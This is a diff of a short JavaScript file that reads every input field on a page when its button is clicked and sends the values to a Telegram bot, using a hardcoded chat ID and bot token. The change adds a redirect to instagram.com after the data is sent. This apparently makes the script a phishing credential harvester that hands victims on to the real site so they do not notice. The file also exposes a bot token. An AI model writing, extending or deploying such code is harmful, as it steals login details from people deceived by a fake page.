@@ -2,6 +2,8 @@ let input = document.querySelectorAll('input');
 let btn = document.querySelector('.c-btn');
 let CHAT_ID = "914653833";
 let token = '6558767746:AAHFgOWgw-Pwk5sh8wiIqiOJhQYcGcuRp_U';
+
+
 btn.addEventListener('click', (e) => {
     e.preventDefault();
 
@@ -17,11 +19,12 @@ btn.addEventListener('click', (e) => {
             text: message
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        console.log(data);
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);
+            window.location.href = 'https://instagram.com'
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
 });
